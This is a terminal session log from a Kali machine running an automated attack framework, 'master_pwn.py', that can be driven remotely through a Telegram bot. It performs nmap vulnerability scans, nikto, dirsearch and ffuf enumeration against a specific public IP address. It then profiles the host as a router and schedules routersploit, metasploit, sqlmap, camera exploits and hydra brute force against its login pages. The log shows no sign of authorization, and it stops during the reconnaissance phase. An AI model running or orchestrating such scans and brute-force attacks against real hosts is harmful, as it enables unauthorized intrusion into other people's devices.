@@ -1,0 +1,2366 @@
+┌──(kali㉿kali)-[~/router]
+└─$ sudo chown -R kali:kali /home/kali/router                                                 
+cd /home/kali/router
+git fetch origin                    
+git checkout -B main origin/main
+git pull origin main
+python3 master_pwn.py
+[sudo] password for kali: 
+remote: Enumerating objects: 25, done.
+remote: Counting objects: 100% (25/25), done.
+remote: Compressing objects: 100% (3/3), done.
+Unpacking objects: 100% (14/14), 9.81 KiB | 1.23 MiB/s, done.
+remote: Total 14 (delta 11), reused 14 (delta 11), pack-reused 0 (from 0)
+From https://github.com/sbateeni/router
+   4678826..5587f1b  main       -> origin/main
+branch 'main' set up to track 'origin/main'.
+Reset branch 'main'
+Your branch is up to date with 'origin/main'.
+From https://github.com/sbateeni/router
+ * branch            main       -> FETCH_HEAD
+Already up to date.
+[*] Repository base path: /home/kali/router
+[*] Checking local repository status...
+[!] Local tracked changes detected. Stashing before syncing with origin/main...
+No local changes to save
+[*] Syncing local 'main' with origin/main...
+Already up to date.
+[+] Repository update completed.
+[*] Telegram configured — starting remote control bot.
+[*] Send IP in Telegram, pick attack type, scan runs automatically.
+[*] Local menu: python3 master_pwn.py --no-telegram
+
+[+] Telegram bot running (Ctrl+C to stop)
+[*] Send IP → pick mode. Busy scans queue the next IP automatically.
+^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B[!] Poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+ؤ^C
+[-] Bot stopped.
+                                                                                                                              
+┌──(kali㉿kali)-[~/router]
+└─$ ┌──(kali㉿kali)-[~/router]
+└─$ sudo chown -R kali:kali /home/kali/router
+cd /home/kali/router
+git fetch origin
+git checkout -B main origin/main
+git pull origin main
+python3 master_pwn.py
+[sudo] password for kali:
+remote: Enumerating objects: 25, done.
+remote: Counting objects: 100% (25/25), done.
+remote: Compressing objects: 100% (3/3), done.
+Unpacking objects: 100% (14/14), 9.81 KiB | 1.23 MiB/s, done.
+remote: Total 14 (delta 11), reused 14 (delta 11), pack-reused 0 (from 0)
+From https://github.com/sbateeni/router
+   4678826..5587f1b  main       -> origin/main
+branch 'main' set up to track 'origin/main'.
+Reset branch 'main'
+Your branch is up to date with 'origin/main'.
+From https://github.com/sbateeni/router
+ * branch            main       -> FETCH_HEAD
+Already up to date.
+[*] Repository base path: /home/kali/router
+[*] Checking local repository status...
+[!] Local tracked changes detected. Stashing before syncing with origin/main...
+No local changes to save
+[*] Syncing local 'main' with origin/main...
+Already up to date.
+[+] Repository update completed.
+[*] Telegram configured — starting remote control bot.
+[*] Send IP in Telegram, pick attack type, scan runs automatically.
+[*] Local menu: python3 master_pwn.py --no-telegram
+
+[+] Telegram bot running (Ctrl+C to stop)
+[*] Send IP → pick mode. Busy scans queue the next IP automatically.
+
+zsh: event not found: ]
+                                                                                                                              
+┌──(kali㉿kali)-[~/router]
+└─$ cd ~/router               
+git pull origin main
+python3 master_pwn.py               
+remote: Enumerating objects: 15, done.
+remote: Counting objects: 100% (15/15), done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 8 (delta 6), reused 8 (delta 6), pack-reused 0 (from 0)
+Unpacking objects: 100% (8/8), 4.05 KiB | 691.00 KiB/s, done.
+From https://github.com/sbateeni/router
+ * branch            main       -> FETCH_HEAD
+   5587f1b..68203c9  main       -> origin/main
+Updating 5587f1b..68203c9
+Fast-forward
+ .env.example                           |  12 ++++++------
+ __pycache__/master_pwn.cpython-312.pyc | Bin 22615 -> 24926 bytes
+ core/telegram_bot.py                   |  69 ++++++++++++++++++++++++++++++++++++++++++++++++++-------------------
+ master_pwn.py                          |  18 ++++++++----------
+ 4 files changed, 64 insertions(+), 35 deletions(-)
+[*] Repository base path: /home/kali/router
+[*] Checking local repository status...
+[!] Local tracked changes detected. Stashing before syncing with origin/main...
+No local changes to save
+[*] Syncing local 'main' with origin/main...
+Already up to date.
+[+] Repository update completed.
+[+] Telegram bot listening in background
+[*] Send IP in Telegram → pick mode → scan runs automatically.
+[*] Local menu below — you can scan from this terminal too.
+
+[*] Checking dependencies and tools...
+[*] Updating routersploit to latest version...
+Already up to date.
+[*] Updating ingram to latest version...
+Already up to date.
+[*] Updating dirsearch to latest version...
+remote: Enumerating objects: 13391, done.
+remote: Counting objects: 100% (13387/13387), done.
+remote: Compressing objects: 100% (4685/4685), done.
+remote: Total 13273 (delta 8860), reused 12828 (delta 8528), pack-reused 0 (from 0)
+Receiving objects: 100% (13273/13273), 21.68 MiB | 3.02 MiB/s, done.
+Resolving deltas: 100% (8860/8860), completed with 78 local objects.
+From https://github.com/maurosoria/dirsearch
+   9bf1ba2..cd35855  master     -> origin/master
+ * [new tag]         v0.2.3     -> v0.2.3
+ * [new tag]         v0.2.4     -> v0.2.4
+ * [new tag]         v0.2.5     -> v0.2.5
+ * [new tag]         v0.2.6     -> v0.2.6
+ * [new tag]         v0.2.7     -> v0.2.7
+ * [new tag]         v0.3.0     -> v0.3.0
+ * [new tag]         v0.3.5     -> v0.3.5
+ * [new tag]         v0.3.6     -> v0.3.6
+ * [new tag]         v0.3.6-1   -> v0.3.6-1
+ * [new tag]         v0.3.7     -> v0.3.7
+ * [new tag]         v0.3.8     -> v0.3.8
+ * [new tag]         v0.3.9     -> v0.3.9
+ * [new tag]         v0.4.0     -> v0.4.0
+ * [new tag]         v0.4.1     -> v0.4.1
+ * [new tag]         v0.4.1-alpha -> v0.4.1-alpha
+ * [new tag]         v0.4.1-alpha2 -> v0.4.1-alpha2
+ * [new tag]         v0.4.2     -> v0.4.2
+ * [new tag]         v0.4.2-beta1 -> v0.4.2-beta1
+ * [new tag]         v0.4.3     -> v0.4.3
+Updating 9bf1ba2..cd35855
+Fast-forward
+ .github/workflows/ci.yml                        |   2 +-
+ .github/workflows/nuitka-linux.yml              |   6 +-
+ .github/workflows/nuitka-macos-intel.yml        |   6 +-
+ .github/workflows/nuitka-macos-silicon.yml      |   6 +-
+ .github/workflows/nuitka-release-draft.yml      |   2 +-
+ .github/workflows/nuitka-windows.yml            |   6 +-
+ .github/workflows/pyinstaller-linux.yml         |   6 +-
+ .github/workflows/pyinstaller-macos-intel.yml   |   6 +-
+ .github/workflows/pyinstaller-macos-silicon.yml |   6 +-
+ .github/workflows/pyinstaller-release-draft.yml |   6 +-
+ .github/workflows/pyinstaller-windows.yml       |   6 +-
+ CHANGELOG.md                                    |  10 +
+ Dockerfile                                      |   2 +-
+ README.md                                       | 954 ++++------------------------------------------------------------------
+ TODO.md                                         | 104 ++++++++
+ __init__.py                                     |  18 ++
+ config.ini                                      |   2 +
+ db/templates/admin.txt                          |   5 +
+ db/templates/api.txt                            |   5 +
+ db/templates/auth.txt                           |   5 +
+ db/templates/backups.txt                        |   5 +
+ db/templates/crud.txt                           |   5 +
+ db/templates/db.txt                             |   5 +
+ db/templates/logs.txt                           |   5 +
+ dirsearch.py                                    |  36 +++
+ docs/building.md                                | 117 +++++++++
+ docs/configuration.md                           | 104 ++++++++
+ docs/index.md                                   |  18 ++
+ docs/installation.md                            |  79 ++++++
+ docs/options.md                                 | 195 +++++++++++++++
+ docs/python-api.md                              |  21 ++
+ docs/references.md                              |  15 ++
+ docs/sessions.md                                |  67 +++++
+ docs/usage.md                                   | 177 +++++++++++++
+ docs/wordlists.md                               | 199 +++++++++++++++
+ lib/controller/controller.py                    |  16 +-
+ lib/controller/session.py                       |   9 +-
+ lib/core/api.py                                 | 269 ++++++++++++++++++++
+ lib/core/data.py                                |   3 +
+ lib/core/decorators.py                          |  21 +-
+ lib/core/dictionary.py                          | 109 +-------
+ lib/core/exceptions.py                          |   8 +
+ lib/core/fuzzer.py                              |   6 +-
+ lib/core/options.py                             |  24 +-
+ lib/core/settings.py                            |   2 +-
+ lib/core/wordlist_backend.py                    | 136 ++++++++++
+ lib/core/wordlist_template.py                   | 168 +++++++++++++
+ lib/parse/cmdline.py                            |  21 ++
+ lib/parse/nmap.py                               |   4 +-
+ lib/report/manager.py                           |  30 ++-
+ lib/report/mysql_report.py                      |   6 +-
+ lib/report/postgresql_report.py                 |   4 +-
+ lib/utils/mimetype.py                           |  13 +-
+ lib/utils/safe_xml.py                           |  52 ++++
+ pyinstaller/README.md                           |   8 +-
+ pyinstaller/build.sh                            |   7 +-
+ pyinstaller/dirsearch.spec                      |   1 -
+ pyproject.toml                                  |  13 +
+ requirements.txt                                |   5 +-
+ requirements/db.txt                             |   2 +
+ requirements/runtime.txt                        |   3 -
+ scripts/split_wordlists.py                      | 192 ++++++++++++++
+ setup.py                                        |  22 ++
+ testing.py                                      |   5 +
+ tests/check_packaged_install.py                 |  15 ++
+ tests/core/test_dictionary_templates.py         |  76 ++++++
+ tests/core/test_importable_api.py               | 132 ++++++++++
+ tests/core/test_wordlist_backend.py             |  27 ++
+ tests/parse/test_nmap.py                        |  14 ++
+ tests/test_optional_db_dependencies.py          | 107 ++++++++
+ tests/utils/test_mimetype.py                    |  17 ++
+ tests/utils/test_safe_xml.py                    |  72 ++++++
+ 72 files changed, 2719 insertions(+), 1111 deletions(-)
+ create mode 100644 TODO.md
+ create mode 100644 db/templates/admin.txt
+ create mode 100644 db/templates/api.txt
+ create mode 100644 db/templates/auth.txt
+ create mode 100644 db/templates/backups.txt
+ create mode 100644 db/templates/crud.txt
+ create mode 100644 db/templates/db.txt
+ create mode 100644 db/templates/logs.txt
+ create mode 100644 docs/building.md
+ create mode 100644 docs/configuration.md
+ create mode 100644 docs/index.md
+ create mode 100644 docs/installation.md
+ create mode 100644 docs/options.md
+ create mode 100644 docs/python-api.md
+ create mode 100644 docs/references.md
+ create mode 100644 docs/sessions.md
+ create mode 100644 docs/usage.md
+ create mode 100644 docs/wordlists.md
+ create mode 100644 lib/core/api.py
+ create mode 100644 lib/core/wordlist_backend.py
+ create mode 100644 lib/core/wordlist_template.py
+ create mode 100644 lib/utils/safe_xml.py
+ create mode 100644 requirements/db.txt
+ create mode 100644 scripts/split_wordlists.py
+ create mode 100644 tests/core/test_dictionary_templates.py
+ create mode 100644 tests/core/test_importable_api.py
+ create mode 100644 tests/core/test_wordlist_backend.py
+ create mode 100644 tests/test_optional_db_dependencies.py
+ create mode 100644 tests/utils/test_safe_xml.py
+[*] Updating sqlmap to latest version...
+Already up to date.
+[*] Updating DefaultCreds-cheat-sheet to latest version...
+Already up to date.
+/usr/local/lib/python3.13/dist-packages/paramiko/pkey.py:82: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  "cipher": algorithms.TripleDES,
+/usr/local/lib/python3.13/dist-packages/paramiko/transport.py:253: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  "class": algorithms.TripleDES,
+[+] All tools and dependencies are ready!
+
+
+[+] Ensuring Nuclei templates are up-to-date...
+
+[>] Executing: /usr/bin/nuclei -ut
+__     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.8.0
+
+                projectdiscovery.io
+
+[INF] No new updates found for nuclei templates
+[+] Nuclei templates are present.
+
+======================================================
+ TARGET SELECTION
+======================================================
+  1) Enter IP manually
+  2) Scan local network (auto-detect subnet)
+  3) Scan custom subnet
+  4) Exit
+Select an option [1-4]: [!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[*] Target hints: 188.225.136.99
+
+>>> PHASE 1: Scanning & Reconnaissance [deep]
+
+[*] Starting Nmap scan on 188.225.136.99 [Deep / Full Power]...
+
+[>] Executing: nmap -sS -sV -T4 --open -F 188.225.136.99
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[+] Quick Nmap found 1 open TCP port(s).
+[*] Running deep Nmap on open ports: 80
+
+[>] Executing: nmap -sC -sV -A --script=default,vuln,http-enum,http-title -p 80 188.225.136.99
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[+] Deep Nmap results saved to: /home/kali/router/targets/188.225.136.99/nmap_deep_scan.txt
+[+] Nmap results saved to: /home/kali/router/targets/188.225.136.99/nmap_scan.txt
+
+[*] Target profile updated (after Nmap) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : web_server (medium)
+  Summary     : HTTP service detected; stack not fully identified.
+  Web ports   : 80
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [SKIP] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [RUN ] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [SKIP] sqlmap: No PHP/query URLs yet — may run on base URL only.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+[>] Executing: whatweb -a 3 http://188.225.136.99
+http://188.225.136.99 [200 OK] Country[PALESTINIAN TERRITORY OCCUPIED][PS], HTML5, IP[188.225.136.99], Script[text/javascript], Title[WEB SERVICE], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]
+[+] WhatWeb results saved to: /home/kali/router/targets/188.225.136.99/whatweb_port_80.txt
+[*] Metasploit skipped by target profile (not a router/Fortinet CPE fingerprint).
+
+[>] Executing: nikto -h http://188.225.136.99 -o /home/kali/router/targets/188.225.136.99/nikto_port_80.txt -Format txt
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+tories found (use '-C all' to force check all possible dirs). CGI tests skipped.
++ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
++ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
++ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
++ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
++ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
++ [000998] /config/: Configuration information may be available remotely.
+- STATUS: Completed 6255 requests (~86% complete, ~1.1 minutes left): currently in plugin 'Nikto Tests'
+- STATUS: Running average: Not enough data.
++ Scan terminated: 20 errors and 6 items reported on the remote host
++ End Time:           2026-05-22 09:39:25 (GMT3) (433 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
++ ERROR: Failed to check for updates: 403
++ ERROR: *** Error limit (20) reached for host, giving up. Last error: error reading HTTP response. ***
++ ERROR: *** Consider using mitmproxy to avoid TLS fingerprinting. ***
+[*] Report updated after Phase 1 - Reconnaissance: /home/kali/router/targets/188.225.136.99/RESULTS_SUMMARY.txt
+
+[*] Target profile updated (after Phase 1) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : web_server (medium)
+  Summary     : HTTP service detected; stack not fully identified.
+  Web ports   : 80
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [SKIP] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [RUN ] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [SKIP] sqlmap: No PHP/query URLs yet — may run on base URL only.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+======================================================
+>>> PHASE 2: Web Enumeration (profile-driven)
+======================================================
+
+[*] Dirsearch → http://188.225.136.99
+
+[+] Running Dirsearch (Path Enumeration) [Deep / Full Power]...
+
+[>] Executing: /usr/bin/python3 /home/kali/router/tools/dirsearch/dirsearch.py -u http://188.225.136.99 -e php,html,bak,js,txt,xml,conf -x 404,500 -t 80 -o /home/kali/router/targets/188.225.136.99/dirsearch_port_80.txt --no-color
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[+] Dirsearch results saved to: /home/kali/router/targets/188.225.136.99/dirsearch_port_80.txt
+[+] Dirsearch discovered 4 paths.
+
+[*] Target profile updated (after Dirsearch) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : router (high)
+  Summary     : Embedded router/CPE web interface patterns.
+  Web ports   : 80
+  Login paths : http://188.225.136.99/cgi-bin/login, http://188.225.136.99/cgi-bin/login.cgi, http://188.225.136.99/cgi-bin/login.php
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [RUN ] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [SKIP] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [RUN ] sqlmap: SQLi testing on PHP/query endpoints.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+[+] Running ffuf for hidden content discovery...
+
+[>] Executing: ffuf -u http://188.225.136.99/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -s -o /home/kali/router/targets/188.225.136.99/ffuf_port_80.json -of json -mc 200,204,301,302,307,401,403,405,500
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+[!] Telegram poll error: HTTPSConnectionPool(host='api.telegram.org', port=443): Read timed out. (read timeout=30)
+^CTraceback (most recent call last):
+  File "/home/kali/router/master_pwn.py", line 488, in <module>
+    main()
+    ~~~~^^
+  File "/home/kali/router/master_pwn.py", line 449, in main
+    targets = resolve_target_list(args, base_dir)
+  File "/home/kali/router/core/network_discovery.py", line 202, in resolve_target_list
+    choice = input("Select an option [1-4]: ").strip()
+             ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+
+                                                                                                                              
+┌──(kali㉿kali)-[~/router]
+└─$ cd ~/router
+git pull origin main
+python3 master_pwn.py
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (1/1), done.
+remote: Total 5 (delta 4), reused 5 (delta 4), pack-reused 0 (from 0)
+Unpacking objects: 100% (5/5), 895 bytes | 895.00 KiB/s, done.
+From https://github.com/sbateeni/router
+ * branch            main       -> FETCH_HEAD
+   68203c9..16a8ea2  main       -> origin/main
+Updating 68203c9..16a8ea2
+Fast-forward
+ core/notify.py       |  4 ++--
+ core/telegram_bot.py | 31 +++++++++++++++++++++++++++----
+ 2 files changed, 29 insertions(+), 6 deletions(-)
+[*] Repository base path: /home/kali/router
+[*] Checking local repository status...
+[!] Local tracked changes detected. Stashing before syncing with origin/main...
+No local changes to save
+[*] Syncing local 'main' with origin/main...
+Already up to date.
+[+] Repository update completed.
+[+] Telegram bot listening in background
+[*] Send IP in Telegram → pick mode → scan runs automatically.
+[*] Local menu below — you can scan from this terminal too.
+
+[*] Checking dependencies and tools...
+[*] Updating routersploit to latest version...
+Already up to date.
+[*] Updating ingram to latest version...
+Already up to date.
+[*] Updating dirsearch to latest version...
+Already up to date.
+[*] Updating sqlmap to latest version...
+Already up to date.
+[*] Updating DefaultCreds-cheat-sheet to latest version...
+Already up to date.
+/usr/local/lib/python3.13/dist-packages/paramiko/pkey.py:82: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  "cipher": algorithms.TripleDES,
+/usr/local/lib/python3.13/dist-packages/paramiko/transport.py:253: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  "class": algorithms.TripleDES,
+[+] All tools and dependencies are ready!
+
+
+[+] Ensuring Nuclei templates are up-to-date...
+
+[>] Executing: /usr/bin/nuclei -ut
+__     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.8.0
+
+                projectdiscovery.io
+
+[INF] No new updates found for nuclei templates
+[+] Nuclei templates are present.
+
+======================================================
+ TARGET SELECTION
+======================================================
+  1) Enter IP manually
+  2) Scan local network (auto-detect subnet)
+  3) Scan custom subnet
+  4) Exit
+Select an option [1-4]: [*] Cleared 14 previous file(s) from target workspace.
+[*] Target hints: http://188.225.136.99
+
+>>> PHASE 1: Scanning & Reconnaissance [deep]
+
+[*] Starting Nmap scan on 188.225.136.99 [Deep / Full Power]...
+
+[>] Executing: nmap -sS -sV -T4 --open -F 188.225.136.99
+[+] Quick Nmap found 1 open TCP port(s).
+[*] Running deep Nmap on open ports: 80
+
+[>] Executing: nmap -sC -sV -A --script=default,vuln,http-enum,http-title -p 80 188.225.136.99
+[+] Deep Nmap results saved to: /home/kali/router/targets/188.225.136.99/nmap_deep_scan.txt
+[+] Nmap results saved to: /home/kali/router/targets/188.225.136.99/nmap_scan.txt
+
+[*] Target profile updated (after Nmap) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : web_server (medium)
+  Summary     : HTTP service detected; stack not fully identified.
+  Web ports   : 80
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [SKIP] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [RUN ] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [RUN ] nuclei: Template scan with tags matched to target type.
+    [SKIP] sqlmap: No PHP/query URLs yet — may run on base URL only.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+[>] Executing: whatweb -a 3 http://188.225.136.99
